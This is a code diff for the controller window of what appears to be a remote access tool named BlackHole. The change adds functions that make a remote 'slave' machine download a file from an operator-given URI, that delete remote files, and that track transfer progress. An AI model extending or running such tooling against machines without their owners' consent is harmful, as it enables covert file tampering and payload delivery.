@@ -46,19 +46,55 @@ namespace BlackHole.Master
 
             TargetStatusBar.DataContext = slave;
             FileTransactionsList.DataContext = ViewModelCommands;
-            FilesList.DataContext = ViewModelFiles = new ViewModelCollection<FileMeta>();
+            FilesList.DataContext = ViewModelFiles = new ViewModelCollection<FileMeta>(this);
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="name"></param>
+        private string GetFilePath(string name) => Path.Combine(TxtBoxDirectory.Text, name);
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void OnNavigate(object sender, RoutedEventArgs e)
-        {
-            NavigateToFolder(TxtBoxDirectory.Text);
-        }
+        private void OnDeleteFile(object sender, RoutedEventArgs e) => DeleteSelectedFiles();
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void DeleteSelectedFiles() =>
+            ExecuteOnSelectedItems<FileMeta>(FilesList, (meta) =>
+            {
+                if (meta.Type == FileType.FILE)
+                    DeleteFile(meta.Name);
+            });
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void OnNavigate(object sender, RoutedEventArgs e) => NavigateToTypedFolder();
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void NavigateToTypedFolder() => NavigateToFolder(TxtBoxDirectory.Text);
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void OnUpload(object sender, RoutedEventArgs e) => UploadTypedFile();
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void UploadTypedFile() => UploadFile(TxtBoxUpload.Text);
 
         /// <summary>
         /// 
@@ -77,44 +113,97 @@ namespace BlackHole.Master
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void OnDownloadFile(object sender, RoutedEventArgs e)
-        {
+        private void OnDownloadFile(object sender, RoutedEventArgs e) => DownloadSelectedFiles();
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void DownloadSelectedFiles() => 
             ExecuteOnSelectedItems<FileMeta>(FilesList, (meta) =>
             {
                 if (meta.Type == FileType.FILE)
                     DownloadFile(meta.Name);
             });
-        }
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void OnCancelTransaction(object sender, RoutedEventArgs e)
-        {
+        private void OnCancelTransaction(object sender, RoutedEventArgs e) => CancelSelectedTransactions();
+
+        /// <summary>
+        /// 
+        /// </summary>
+        private void CancelSelectedTransactions() =>
             ExecuteOnSelectedItems<IRemoteCommand>(FileTransactionsList, (transaction) => CancelCommand(transaction.Id));
-        }
-        
+
         /// <summary>
         /// 
         /// </summary>
         /// <param name="folder"></param>
-        private void NavigateToFolder(string folder)
-        {
+        private void NavigateToFolder(string folder) =>
             this.Send(new NavigateToFolderMessage()
             {
                 Path = Path.Combine(TxtBoxDirectory.Text, folder)
-            });
-        }
+            });      
         
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="name"></param>
+        private void DeleteFile(string name)
+        {
+            var filePath = GetFilePath(name);
+            this.Send(new DeleteFileMessage()
+            {
+                FilePath = filePath
+            });
+        }  
+        
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="uri"></param>
+        private void UploadFile(string uri)
+        {
+            var fileName = Path.GetFileName(uri);
+            AddCommand(CommandFactory.CreateCommand<UploadProgressMessage>(
+                CommandType.UPLOAD,
+                Slave,
+                fileName,
+                (command) =>
+                {
+                    this.Send(new UploadFileMessage()
+                    {
+                        Id = command.Id,
+                        Path = GetFilePath(fileName),
+                        Uri = uri,
+                    });
+                },
+                (progress) =>
+                {
+                    // nothing to do on continue
+                },
+                (progress) =>
+                {
+                    Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_UPLOADED, Slave, fileName));
+                    FinishCurrentCommand();
+                    NavigateToTypedFolder();
+                },
+                () =>
+                {
+                    FinishCurrentCommand();
+                }));
+        }
+
         /// <summary>
         /// 
         /// </summary>
         /// <param name="path"></param>
         private void DownloadFile(string name)
         {
-            var filePath = Path.Combine(TxtBoxDirectory.Text, name);
+            var filePath = GetFilePath(name);
 
             AddCommand(CommandFactory.CreateCommand<DownloadedFilePartMessage>(
                 CommandType.DOWNLOAD,
@@ -182,7 +271,7 @@ namespace BlackHole.Master
                                 TargetStatusTooltipMessage.Text = m.Message;
                                 TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
                                 TargetStatusTooltip.PlacementTarget = TargetStatus;
-                                TargetStatusTooltip.IsOpen = true;       
+                                TargetStatusTooltip.IsOpen = true;
                             })
                             .With<DownloadedFilePartMessage>(m =>
                             {
@@ -193,8 +282,20 @@ namespace BlackHole.Master
                                         command.UpdateProgression(m.CurrentPart + 1, m.TotalPart);
                                     });
                             })
-                            .With<DownloadFilePartMessage>(m =>
-                            {                                
+                            .With<UploadProgressMessage>(m =>
+                            {
+                                // will be received when the slave downloaded the file
+                                UpdateCommand(m,
+                                    (command) =>
+                                    {
+                                        command.Completed = m.Percentage == -1;
+                                        if (!command.Completed)
+                                            command.UpdateProgression(m.Percentage, 100);
+                                    });
+                            })
+                            .With<FileDeletionMessage>(m =>
+                            {
+                                NavigateToTypedFolder();
                             });                        
                         break;
                 }
